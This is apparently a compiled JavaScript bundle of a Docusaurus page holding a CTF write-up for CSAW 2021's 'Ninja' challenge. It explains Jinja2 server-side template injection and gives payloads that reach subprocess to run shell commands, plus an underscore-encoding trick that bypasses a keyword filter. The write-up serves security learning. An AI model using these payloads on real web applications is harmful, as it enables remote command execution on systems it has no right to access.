"use strict";(self.webpackChunkwebsite=self.webpackChunkwebsite||[]).push([[3180],{3905:function(e,t,n){n.d(t,{Zo:function(){return p},kt:function(){return m}});var a=n(7294);function i(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function r(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function o(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?r(Object(n),!0).forEach((function(t){i(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):r(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,a,i=function(e,t){if(null==e)return{};var n,a,i={},r=Object.keys(e);for(a=0;a<r.length;a++)n=r[a],t.indexOf(n)>=0||(i[n]=e[n]);return i}(e,t);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(a=0;a<r.length;a++)n=r[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(i[n]=e[n])}return i}var s=a.createContext({}),c=function(e){var t=a.useContext(s),n=t;return e&&(n="function"==typeof e?e(t):o(o({},t),e)),n},p=function(e){var t=c(e.components);return a.createElement(s.Provider,{value:t},e.children)},u={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},d=a.forwardRef((function(e,t){var n=e.components,i=e.mdxType,r=e.originalType,s=e.parentName,p=l(e,["components","mdxType","originalType","parentName"]),d=c(n),m=i,f=d["".concat(s,".").concat(m)]||d[m]||u[m]||r;return n?a.createElement(f,o(o({ref:t},p),{},{components:n})):a.createElement(f,o({ref:t},p))}));function m(e,t){var n=arguments,i=t&&t.mdxType;if("string"==typeof e||i){var r=n.length,o=new Array(r);o[0]=d;var l={};for(var s in t)hasOwnProperty.call(t,s)&&(l[s]=t[s]);l.originalType=e,l.mdxType="string"==typeof e?e:i,o[1]=l;for(var c=2;c<r;c++)o[c]=n[c];return a.createElement.apply(null,o)}return a.createElement.apply(null,n)}d.displayName="MDXCreateElement"},2592:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return l},contentTitle:function(){return s},metadata:function(){return c},toc:function(){return p},default:function(){return d}});var a=n(7462),i=n(3366),r=(n(7294),n(3905)),o=["components"],l={},s="Ninja",c={unversionedId:"CSAW Qualification 2021/ninja",id:"CSAW Qualification 2021/ninja",isDocsHomePage:!1,title:"Ninja",description:"Description",source:"@site/docs/CSAW Qualification 2021/ninja.md",sourceDirName:"CSAW Qualification 2021",slug:"/CSAW Qualification 2021/ninja",permalink:"/Writeups/docs/CSAW Qualification 2021/ninja",editUrl:"https://github.com/datthinh1801/Writupes/tree/main/website/docs/CSAW Qualification 2021/ninja.md",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Introduction",permalink:"/Writeups/docs/intro"},next:{title:"Basic Injection",permalink:"/Writeups/docs/CTFlearn/Basic Injection"}},p=[{value:"Description",id:"description",children:[]},{value:"Solution",id:"solution",children:[{value:"Some fundamentals",id:"some-fundamentals",children:[]},{value:"Initial payload",id:"initial-payload",children:[]},{value:"Bypass filters",id:"bypass-filters",children:[]}]}],u={toc:p};function d(e){var t=e.components,n=(0,i.Z)(e,o);return(0,r.kt)("wrapper",(0,a.Z)({},u,n,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"ninja"},"Ninja"),(0,r.kt)("h2",{id:"description"},"Description"),(0,r.kt)("p",null,"Hey guys come check out this website I made to test my ninja-coding skills.",(0,r.kt)("br",{parentName:"p"}),"\n",(0,r.kt)("a",{parentName:"p",href:"http://web.chal.csaw.io:5000"},"http://web.chal.csaw.io:5000")),(0,r.kt)("h2",{id:"solution"},"Solution"),(0,r.kt)("p",null,"This website has Server-side Template Injection (SSTI) vulnerability."),(0,r.kt)("h3",{id:"some-fundamentals"},"Some fundamentals"),(0,r.kt)("p",null,"Some key points to exploit jinja2 SSTI:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"__mro__")," (",(0,r.kt)("strong",{parentName:"li"},"method resultion order"),") to access base classes of the current class. In other words, we use ",(0,r.kt)("inlineCode",{parentName:"li"},"__mro__")," to ",(0,r.kt)("strong",{parentName:"li"},"go up")," the inheritance tree."),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"__subclasses__()")," to list all child classes of the current class. In other words, we use ",(0,r.kt)("inlineCode",{parentName:"li"},"__subclasses__()")," to ",(0,r.kt)("strong",{parentName:"li"},"go down")," the inheritance tree."),(0,r.kt)("li",{parentName:"ul"},"The ",(0,r.kt)("inlineCode",{parentName:"li"},"object")," class which is the ",(0,r.kt)("strong",{parentName:"li"},"root")," of all objects in Python; therefore, once we can access the ",(0,r.kt)("inlineCode",{parentName:"li"},"object")," class, we can call every object defined in the current file.")),(0,r.kt)("h3",{id:"initial-payload"},"Initial payload"),(0,r.kt)("p",null,"I have crafted a small program in my machine to test the payload and this one is what I want:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-python"},'self.__class__.__base__.__subclasses__()[279]()(["cat","flag.txt"],shell=True,stdout=-1).communicate()[0]\n')),(0,r.kt)("h3",{id:"bypass-filters"},"Bypass filters"),(0,r.kt)("p",null,"There is a filter in this application:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"Sorry, the following keywords/characters are not allowed :- _ ,config ,os, RUNCMD, base\n")),(0,r.kt)("p",null,"First, the ",(0,r.kt)("inlineCode",{parentName:"p"},"_")," character is significantly important for SSTI exploitation. So in order to bypass this, I found 2 ways:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Encode ",(0,r.kt)("inlineCode",{parentName:"li"},"_")," as ",(0,r.kt)("inlineCode",{parentName:"li"},"\\x5f")," (which is the Unicode encoding for ",(0,r.kt)("inlineCode",{parentName:"li"},"_"),"). However, to access a property or method using ",(0,r.kt)("inlineCode",{parentName:"li"},"string")," name, I need to use ",(0,r.kt)("inlineCode",{parentName:"li"},"[]")," rather than ",(0,r.kt)("inlineCode",{parentName:"li"},"."),"."),(0,r.kt)("li",{parentName:"ul"},"Use the ",(0,r.kt)("inlineCode",{parentName:"li"},"attr()")," to get an attribute. Furthermore, we can use ",(0,r.kt)("inlineCode",{parentName:"li"},"|join")," which will be handy in some cases when we want to concatenate strings.")),(0,r.kt)("p",null,"Second, I need to bypass the ",(0,r.kt)("inlineCode",{parentName:"p"},"base")," filter. To do that, I can use ",(0,r.kt)("inlineCode",{parentName:"p"},"__mro__[1]"),"."),(0,r.kt)("p",null,"With these information, my payload becomes:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-python"},"self['\\x5f\\x5fclass\\x5f\\x5f']['\\x5f\\x5fmro\\x5f\\x5f'][1]['\\x5f\\x5fsubclasses\\x5f\\x5f']()[279](['cat','flag.txt'],shell=True,stdout=-1).communicate()[0].decode('utf-8')\n")),(0,r.kt)("blockquote",null,(0,r.kt)("p",{parentName:"blockquote"},"Flag: ",(0,r.kt)("inlineCode",{parentName:"p"},"flag{m0mmy_s33_1m_4_r34l_n1nj4}"),".")))}d.isMDXComponent=!0}}]);